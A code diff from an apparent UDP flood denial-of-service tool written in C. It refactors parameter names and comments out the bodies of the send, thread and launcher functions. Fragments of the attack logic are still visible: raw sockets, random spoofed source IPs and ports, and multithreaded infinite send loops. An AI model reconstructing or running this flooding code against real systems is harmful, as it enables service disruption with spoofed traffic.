@@ -16,26 +16,15 @@
 #include <netinet/udp.h> // struct udp
 #include <arpa/inet.h>
 
-#include "main.h"
-#include "udp_flood_dos.h"
+#include "../main.h"
+#include "../debug.h"
 
-// from ../core/core_log.c
-extern size_t ShowMessage(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern size_t InfoMessage(const char *fmt, ...);
-extern size_t DebugMessage(const char *fmtsring, ...);
-extern size_t ErrorMessage(const char *fmt, ...);
-
-extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
-
-extern void FreeSplitUrlBuff(pSplitUrlOutput p);
-extern size_t SplitUrl(const char *url, pSplitUrlOutput *output);
-extern void FreeRandomIPBuff(char *p);
-extern size_t GetRandomIP(char **output);
-extern size_t GetRandomPort(size_t *output);
+#include "udp_flood.h"
 
 static int SendUDP(const pUDPStruct us, const int debug_level)
 {
 
+    /*
     int socket_fd;
     socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (socket_fd < 0)
@@ -123,6 +112,7 @@ static int SendUDP(const pUDPStruct us, const int debug_level)
     //libere la memoire
     free(datagram);
     close(socket_fd);
+    */
     return 0;
 }
 
@@ -139,12 +129,13 @@ static void FreeUDPStrutBuff(pUDPStruct input)
     }
 }
 
-static int AttackThread(const pInput input)
+static int AttackThread(const pParameter input)
 {
     // here is udp flood thread
 
+    /*
     pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
-    pSplitUrlOutput split_result;
+    pSplitUrlRet split_result;
     int i;
 
     if (!SplitUrl(input->address, &split_result))
@@ -152,10 +143,10 @@ static int AttackThread(const pInput input)
         ErrorMessage("AttackThread SplitUrl failed");
         return 1;
     }
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->protocol);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->host);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %d", split_result->port);
-    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->suffix);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->protocol);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->host);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %d", split_result->port);
+    ShowMessage(DEBUG, input->debug_mode, "split_reult: %s", split_result->suffix);
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
@@ -187,10 +178,10 @@ static int AttackThread(const pInput input)
     FreeSplitUrlBuff(split_result);
     udp_struct->each_ip_repeat = input->each_ip_repeat;
 
-    ShowMessage(VERBOSE, input->debug_level, "AttackThread start sending data...");
+    ShowMessage(VERBOSE, input->debug_mode, "AttackThread start sending data...");
     for (;;)
     {
-        if (input->random_sip_address == ENABLE_SIP)
+        if (input->random_source_ip_address == ENABLE_SIP)
         {
             // randome ip and port
             if (!GetRandomIP(&(udp_struct->src_ip)))
@@ -215,7 +206,7 @@ static int AttackThread(const pInput input)
         // rport is random source port
         for (i = 0; i < input->each_ip_repeat; i++)
         {
-            if (SendUDP(udp_struct, input->debug_level))
+            if (SendUDP(udp_struct, input->debug_mode))
             {
                 ErrorMessage("AttackThread Attack failed");
                 //return 1;
@@ -224,19 +215,21 @@ static int AttackThread(const pInput input)
         FreeRandomIPBuff(udp_struct->src_ip);
     }
     FreeUDPStrutBuff(udp_struct);
+    */
     return 0;
 }
 
-int StartUDPFloodAttack(const pInput input)
+int StartUDPFloodAttack(const pParameter input)
 {
     // run function in thread
     // this attack type must run as root
 
+    /*
     pthread_t tid[input->max_thread];
     pthread_attr_t attr;
     int j, ret;
 
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartUDPFloodAttack");
+    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodAttack");
 
     extern void SignalExit(int signo);
     signal(SIGINT, SignalExit);
@@ -261,11 +254,11 @@ int StartUDPFloodAttack(const pInput input)
             // create thread
             ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
             //printf("j is: %d\n", j);
-            ShowMessage(DEBUG, input->debug_level, "tid: %ld", tid[j]);
+            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
             // here we make a map
             if (ret != 0)
             {
-                ShowMessage(DEBUG, input->debug_level, "ret: %d", ret);
+                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                 ErrorMessage("Create pthread failed");
                 return 1;
             }
@@ -278,13 +271,14 @@ int StartUDPFloodAttack(const pInput input)
             pthread_join(tid[j], NULL);
         }
     }
+    */
     return 0;
 }
 
-int StartUDPFloodTest(const pInput input)
+int StartUDPFloodTest(const pParameter input)
 {
     // for test
-    ShowMessage(VERBOSE, input->debug_level, "Enter StartUDPFloodTest");
+    ShowMessage(VERBOSE, input->debug_mode, "Enter StartUDPFloodTest");
     AttackThread(input);
     return 0;
 }
